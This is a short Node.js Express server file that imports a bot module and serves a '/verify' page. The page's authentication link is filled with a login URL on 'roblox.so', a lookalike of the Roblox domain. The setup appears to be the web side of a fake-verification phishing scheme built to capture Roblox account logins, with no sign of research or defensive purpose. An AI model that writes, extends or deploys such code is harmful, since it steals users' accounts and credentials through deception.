import express from 'express';
import fs from 'fs';
import 'dotenv/config';
import './bot.js';

const app = express();
const FINAL_URL = 'https://roblox.so/login?returnUrl=8929026016475016';

app.use(express.static('public'));

app.get('/verify', (req, res) => {
  let html = fs.readFileSync('./views/verify.html', 'utf8');
  html = html.replaceAll('{{AUTH_URL}}', FINAL_URL);
  res.send(html);
});

app.listen(3000, () => console.log('Web server on :3000'));